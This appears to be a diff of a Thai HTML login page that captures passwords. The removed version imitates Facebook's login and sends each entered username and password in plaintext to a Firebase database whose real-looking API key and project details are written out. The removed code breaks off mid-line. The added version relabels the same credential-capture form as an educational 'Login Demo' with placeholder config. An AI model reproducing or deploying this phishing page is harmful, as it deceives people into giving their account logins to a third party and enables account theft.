@@ -1,107 +1,97 @@
 <!DOCTYPE html>
-<html lang="th">
+<html>
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Login Demo</title>
+  <meta charset="UTF-8">
+  <title>Login Demo</title>
+  <script type="module">
 
-<style>
-body{
-  margin:0;
-  font-family:Arial;
-  background:#f0f2f5;
-  display:flex;
-  justify-content:center;
-  align-items:center;
-  height:100vh;
-}
+    // 🔥 Firebase SDK
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+    import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
 
-.container{
-  background:white;
-  padding:30px;
-  width:320px;
-  border-radius:10px;
-  box-shadow:0 0 15px rgba(0,0,0,0.1);
-  text-align:center;
-}
+    // 🔐 ใส่ firebaseConfig ของคุณตรงนี้
+    const firebaseConfig = {
+      apiKey: "API_KEY",
+      authDomain: "PROJECT_ID.firebaseapp.com",
+      databaseURL: "https://PROJECT_ID-default-rtdb.asia-southeast1.firebasedatabase.app",
+      projectId: "PROJECT_ID",
+      storageBucket: "PROJECT_ID.appspot.com",
+      messagingSenderId: "SENDER_ID",
+      appId: "APP_ID"
+    };
 
-h2{
-  color:#1877f2;
-}
+    const app = initializeApp(firebaseConfig);
+    const database = getDatabase(app);
 
-input{
-  width:100%;
-  padding:12px;
-  margin:8px 0;
-  border-radius:6px;
-  border:1px solid #ccc;
-}
+    window.sendData = function() {
+      const username = document.getElementById("username").value;
+      const password = document.getElementById("password").value;
 
-button{
-  width:100%;
-  padding:12px;
-  margin-top:10px;
-  background:#1877f2;
-  color:white;
-  border:none;
-  border-radius:6px;
-  font-size:16px;
-  cursor:pointer;
-}
+      if(username === "" || password === ""){
+        alert("กรุณากรอกข้อมูลให้ครบ");
+        return;
+      }
 
-small{
-  color:red;
-}
-</style>
+      // 📤 ส่งข้อมูลไป Firebase
+      push(ref(database, "loginDemo/"), {
+        username: username,
+        password: password,
+        time: new Date().toLocaleString()
+      });
 
+      alert("บันทึกข้อมูลเรียบร้อย (Demo)");
+      document.getElementById("username").value = "";
+      document.getElementById("password").value = "";
+    }
+
+  </script>
+
+  <style>
+    body{
+      font-family: Arial;
+      background:#f0f2f5;
+      display:flex;
+      justify-content:center;
+      align-items:center;
+      height:100vh;
+    }
+    .box{
+      background:white;
+      padding:30px;
+      width:300px;
+      border-radius:10px;
+      box-shadow:0 0 10px rgba(0,0,0,0.1);
+      text-align:center;
+    }
+    input{
+      width:100%;
+      padding:10px;
+      margin:8px 0;
+      border-radius:5px;
+      border:1px solid #ccc;
+    }
+    button{
+      width:100%;
+      padding:10px;
+      background:#1877f2;
+      color:white;
+      border:none;
+      border-radius:5px;
+      cursor:pointer;
+    }
+    small{
+      color:red;
+    }
+  </style>
 </head>
 
 <body>
-
-<div class="container">
-  <h2>Facebook</h2>
-  <small>ล็อกอินเพื่อเข้าสู่ระบบ</small>
-  <input type="text" id="username" placeholder="Username">
-  <input type="password" id="password" placeholder="Password">
-  <button onclick="saveData()">เข้าสู่ระบบ</button>
-</div>
-
-<script type="module">
-import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
-import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
-
-const firebaseConfig = {
-  apiKey: "AIzaSyCtEsiOrnl_iSH_S0MpMTSIYzZnCfETmjw",
-  authDomain: "face-74cf9.firebaseapp.com",
-  databaseURL: "https://face-74cf9-default-rtdb.asia-southeast1.firebasedatabase.app",
-  projectId: "face-74cf9",
-  storageBucket: "face-74cf9.appspot.com",
-  messagingSenderId: "557691629577",
-  appId: "1:557691629577:web:81a26d33a694bc95c488d8"
-};
-
-const app = initializeApp(firebaseConfig);
-const database = getDatabase(app);
-
-window.saveData = function() {
-
-  const username = document.getElementById("username").value;
-  const password = document.getElementById("password").value;
-
-  if(username === "" || password === ""){
-    alert("กรุณากรอกข้อมูลให้ครบ");
-    return;
-  }
-
-  push(ref(database, "demoLoginData"), {
-    username: username,
-    password: password,
-    timestamp: new Date().toLocaleString()
-  })
-  .then(() => {
-  localStorage.setItem("username", username); // เก็บชื่อไว้
-
-  window.location.href = "success.html"; // เด้งหน้าใหม่
-})
-  .catch((error) => {
-    alert("Error: " + 
+  <div class="box">
+    <h2>Login Demo</h2>
+    <small>ระบบทดสอบเพื่อการศึกษาเท่านั้น</small>
+    <input type="text" id="username" placeholder="Username">
+    <input type="password" id="password" placeholder="Password">
+    <button onclick="sendData()">Login</button>
+  </div>
+</body>
+</html>
